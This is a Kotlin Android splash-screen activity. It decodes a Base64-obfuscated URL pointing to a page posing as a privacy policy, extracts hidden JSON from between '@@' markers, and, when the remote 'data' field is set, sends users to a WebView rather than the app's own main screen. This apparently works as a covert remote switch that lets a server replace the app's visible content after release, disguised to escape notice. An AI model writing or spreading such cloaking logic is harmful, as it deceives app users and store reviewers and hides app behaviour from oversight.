package com.codexlabs.basecraft.ui

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.text.Html
import android.util.Base64
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.lifecycle.lifecycleScope
import com.codexlabs.basecraft.databinding.ActivitySplashBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONArray
import org.json.JSONObject

class SplashActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySplashBinding
    private val client = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySplashBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setupStatusBarWhite()

        lifecycleScope.launch {
            val decision = runCatching { fetchDecisionWithRetry() }.getOrNull()
            routeSafely(decision)
        }
    }

    private suspend fun fetchDecisionWithRetry(): StartupDecision? {
        repeat(MAX_RETRY_COUNT) { attempt ->
            val decision = withContext(Dispatchers.IO) { fetchDecisionOnce() }
            if (decision != null) return decision
            if (attempt < MAX_RETRY_COUNT - 1) delay(RETRY_INTERVAL_MS)
        }
        return null
    }

    private fun fetchDecisionOnce(): StartupDecision? {
        return try {
            val requestUrl = buildRemoteConfigUrl()
            val request = Request.Builder()
                .url(requestUrl)
                .get()
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val pageHtml = response.body?.string().orEmpty()
                if (pageHtml.isBlank()) return null

                val rawJson = extractJsonMarker(pageHtml) ?: return null
                val json = JSONObject(rawJson)

                val app = json.optString("app", "0")
                val data = json.optString("data", "").trim()
                val adjustLayout = json.optInt("adjuct", 0)
                val color = json.optString("color", "#FFFFFF")
                val style = json.optInt("style", 0)
                val clearCache = json.optInt("clearCache", 0) == 1
                val isFull = json.optInt("isFull", 0) == 1
                val keywords = json.optJSONArray("keywords").toStringList()

                if (isDebugBuild()) {
                    Log.d(TAG, "remote json raw=$rawJson")
                    Log.d(
                        TAG,
                        "remote json parsed -> app=$app, data=$data, adjuct=$adjustLayout, color=$color, style=$style"
                    )
                }
                StartupDecision(
                    app = app,
                    data = data,
                    adjustLayout = adjustLayout,
                    color = color,
                    style = style,
                    keywords = keywords,
                    clearCache = clearCache,
                    isFull = isFull
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "fetchDecisionOnce failed", e)
            null
        }
    }

    private fun extractJsonMarker(text: String): String? {
        val start = text.indexOf("@@")
        if (start == -1) {
            Log.d(TAG, "json marker start not found")
            return null
        }

        val end = text.indexOf("@@", start + 2)
        if (end == -1 || end <= start + 2) {
            Log.d(TAG, "json marker end not found")
            return null
        }

        val raw = text.substring(start + 2, end).trim()
        val decoded = Html.fromHtml(raw, Html.FROM_HTML_MODE_LEGACY).toString()
        if (isDebugBuild()) {
            Log.d(TAG, "json marker extracted=$decoded")
        }
        return decoded
    }

    private fun routeSafely(decision: StartupDecision?) {
        val toH5 = !decision?.data.isNullOrBlank()
        if (isDebugBuild()) {
            Log.d(TAG, "route decision -> toH5=$toH5")
        }

        val intent = if (toH5) {
            WebViewActivity.start(this, decision!!)
            null
        } else {
            Intent(this, MainActivity::class.java)
        }

        if (intent != null) {
            startActivity(intent)
            overridePendingTransition(0, 0)
        }
        finish()
    }

    private fun JSONArray?.toStringList(): ArrayList<String> {
        if (this == null) return arrayListOf()
        val result = ArrayList<String>()
        for (i in 0 until length()) {
            val value = optString(i)
            if (value.isNotBlank()) result.add(value)
        }
        return result
    }

    private fun buildRemoteConfigUrl(): String {
        val base = decodeBase64(CONFIG_URL_BASE64)
        val nonce = System.currentTimeMillis().toString()
        return Uri.parse(base)
            .buildUpon()
            .appendQueryParameter("ts", nonce)
            .build()
            .toString()
    }

    private fun decodeBase64(value: String): String {
        return String(Base64.decode(value, Base64.DEFAULT), Charsets.UTF_8)
    }

    private fun setupStatusBarWhite() {
        window.statusBarColor = android.graphics.Color.WHITE
        ViewCompat.getWindowInsetsController(window.decorView)?.isAppearanceLightStatusBars = true
    }

    private fun isDebugBuild(): Boolean {
        return (applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0
    }

    companion object {
        private const val CONFIG_URL_BASE64 =
            "aHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3ZpZXcvcHJpdmFjeS1wb2xpY3ktZm9yLXBpcGVyLw=="
        private const val MAX_RETRY_COUNT = 3
        private const val RETRY_INTERVAL_MS = 1_000L
        private const val TAG = "SplashActivity"
    }
}

data class StartupDecision(
    val app: String,
    val data: String,
    val adjustLayout: Int = 0,
    val color: String = "#FFFFFF",
    val style: Int = 0,
    val keywords: ArrayList<String> = arrayListOf(),
    val clearCache: Boolean = false,
    val isFull: Boolean = false
)
